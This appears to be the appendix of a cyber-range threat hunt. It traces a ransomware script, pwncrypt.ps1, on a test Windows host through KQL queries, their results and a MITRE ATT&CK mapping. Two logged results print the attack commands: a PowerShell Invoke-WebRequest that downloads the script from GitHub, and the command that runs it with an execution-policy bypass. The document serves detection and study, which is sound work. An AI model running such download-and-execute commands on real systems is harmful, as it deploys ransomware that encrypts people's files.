### Project: PwnCrypt Ransomware Project Appendix

#### Summmary:
This threat hunt was performed in Microsfot Azure and Defender XDR for End-Point. Below you'll see tables used with Sentinel (SIEM), KQL commands, and MITRE ATT&CK® Framework Mapping.

#### Raw event tables used:

| Table Name           | Official Documentation                                                                   |
| :------------------- | :--------------------------------------------------------------------------------------- |
| `DeviceNetworkEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicenetworkevents) |
| `DeviceProcessEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents) |
| `DeviceEvents`       | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceevents)       |
| `DeviceFileEvents`   | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicefileevents)   |

#### KQL Appendix:

#### Tracing PowerShell-Initiated pwncrypt.ps1 Download Connection
```kql
let target_device = "arcwin10";
DeviceNetworkEvents
| where DeviceName == target_device and Timestamp == datetime(2025-05-10T19:01:44.3886333Z)
| project Timestamp, ActionType, InitiatingProcessCommandLine, RemoteUrl, InitiatingProcessAccountName, InitiatingProcessFileSize
| where isnotempty( RemoteUrl)
```

Query Result:
| Field                       | Value                                                              |
| :-------------------------- | :----------------------------------------------------------------- |
| Timestamp                   | May 10, 2025 2:01:44 PM                                            |
| ActionType                  | ConnectionSuccess                                                  |
| InitiatingProcessCommandLine| powershell.exe                                                   |
| RemoteUrl                   | hxxps://raw[.]githubusercontent[.]com                            |
| InitiatingProcessAccountName| arcanalyst1                                                      |
| InitiatingProcessFileSize   | 455680                                                           |

#### Confirming `pwncrypt.ps1` Script Execution on `arcwin10`


```kql
let target_device = "arcwin10";
let start_time = datetime(2025-05-10 18:50:00Z); //May 10, 2025 1:50:00 PM CDT
let end_time = datetime(2025-05-10 19:21:00Z); //May 10, 2025 2:21:00 PM CDT
DeviceProcessEvents
| where DeviceName == target_device
| where Timestamp between (start_time .. end_time )
| project Timestamp,AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessCommandLine, FileName, FileSize, AdditionalFields
| where InitiatingProcessFileName contains "powershell" and AccountName == "arcanalyst1"
| sort by Timestamp desc
```

Query Result:
| Field                       | Value                                                              |
| :-------------------------- | :----------------------------------------------------------------- |
| Timestamp                   | May 10, 2025 2:01:44 PM                                            |
| AccountName                 | arcanalyst1                                                      |
| InitiatingProcessFileName   | powershell.exe                                                   |
| InitiatingProcessCommandLine| powershell.exe                                                   |
| ProcessCommandLine          | "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1 |
| FileName                    | cmd.exe                                                          |
| FileSize                    | 289792                                                           |
| AdditionalFields            | {"DesktopName":"Winsta0\\Default"}                               |

#### Verifying Full PowerShell Command Execution via DeviceEvents


```kql
let target_device = "arcwin10";
let start_time = datetime(2025-05-10 18:50:00Z); //May 10, 2025 1:50:00 PM CDT
let end_time = datetime(2025-05-10 19:21:00Z); //May 10, 2025 2:21:00 PM CDT
DeviceEvents
| where DeviceName == target_device
| where Timestamp between (start_time .. end_time )
| project Timestamp, ActionType, InitiatingProcessSHA1, InitiatingProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessParentFileName, AdditionalFields
| where ActionType contains "PowerShellCommand"
| sort by Timestamp asc
```

Query Result:
| Field                       | Value                                                              |
| :-------------------------- | :----------------------------------------------------------------- |
| Timestamp                   | May 10, 2025 2:01:44 PM                                            |
| ActionType                  | PowerShellCommand                                                |
| InitiatingProcessSHA1       | 801262e122d6a2e758962896260d55bbd0136a                           |
| InitiatingProcessCommandLine| powershell.exe                                                   |
| InitiatingProcessAccountName| arcanalyst1                                                      |
| InitiatingProcessParentFileName| explorer.exe                                                    |
| AdditionalFields            | {"Command":"Invoke-WebRequest -Uri 'hxxps://raw[.]githubusercontent[.]com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt[.]ps1' -OutFile 'C:\\programdata\\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\pwncrypt.ps1"} |

#### Tracing `pwncrypt.ps1` Ransomware File Renaming Activity

```kql
let target_device = "arcwin10";
DeviceFileEvents
| where DeviceName == target_device
| where ActionType == "FileRenamed" and FolderPath contains "pwncrypt"
| project Timestamp, ActionType, FileName, PreviousFolderPath, InitiatingProcessAccountName, InitiatingProcessFileName
| sort by Timestamp asc
```

Query Result:
| Timestamp           | ActionType  | FileName                                   | PreviousFolderPath               | InitiatingProcessAccountName | InitiatingProcessFileName |
| :------------------ | :---------- | :----------------------------------------- | :------------------------------- | :--------------------------- | :------------------------ |
| May 10, 2025 2:01:45 PM | FileRenamed | 3546_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
| May 10, 2025 2:01:45 PM | FileRenamed | 6267_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
| May 10, 2025 2:01:45 PM | FileRenamed | 6705_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
| May 10, 2025 3:13:16 PM | FileRenamed | 4362_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 3:13:16 PM | FileRenamed | 9982_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 3:13:16 PM | FileRenamed | 4489_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 7:13:25 PM | FileRenamed | 8270_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 7:13:25 PM | FileRenamed | 1130_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 7:13:25 PM | FileRenamed | 4935_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 11:13:26 PM| FileRenamed | 6642_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 11:13:26 PM| FileRenamed | 8762_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
| May 10, 2025 11:13:26 PM| FileRenamed | 8357_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |

### MITRE ATT&CK Framework

* **Command and Control** (`TA0011`):
    * **Payload Delivery:** `pwncrypt.ps1` was downloaded from an external GitHub URL using PowerShell's `Invoke-WebRequest` (aligns with `T1105` - Ingress Tool Transfer, leveraging `T1071.001` - Application Layer Protocol: Web Protocols).

* **Execution** (`TA0002`):
    * **PowerShell Scripting:** The core malware `pwncrypt.ps1` was executed via `powershell.exe` (`T1059.001` - Command and Scripting Interpreter: PowerShell).
    * **Command Shell Invocation:** `cmd.exe` was used to launch the PowerShell process that ran `pwncrypt.ps1` (`T1059.003` - Command and Scripting Interpreter: Windows Command Shell).

* **Defense Evasion** (`TA0005`):
    * **Execution Policy Bypass:** The script was run with `powershell.exe -ExecutionPolicy Bypass` to circumvent script execution restrictions (a common aspect of abusing `T1059.001` - PowerShell for defense evasion).

* **Privilege Escalation** (`TA0004`):
    * **Indicated Capability:** Later file encryption activity was observed under the `SYSTEM` account, and VirusTotal associated this tactic with the malware's hash, suggesting `pwncrypt.ps1` has or attempts privilege escalation. (The specific technique used by `pwncrypt.ps1` for this wasn't detailed in the provided logs).

* **Discovery** (`TA0007`):
    * **File & Directory Discovery:** The script enumerated user files and directories to identify targets for encryption (aligns with `T1083` - File and Directory Discovery).

* **Impact** (`TA0040`):
    * **Data Encrypted for Impact:** Files were encrypted, renamed (e.g., with `_pwncrypt.csv` suffix), and ransom/decryption instructions were generated (`T1486`).
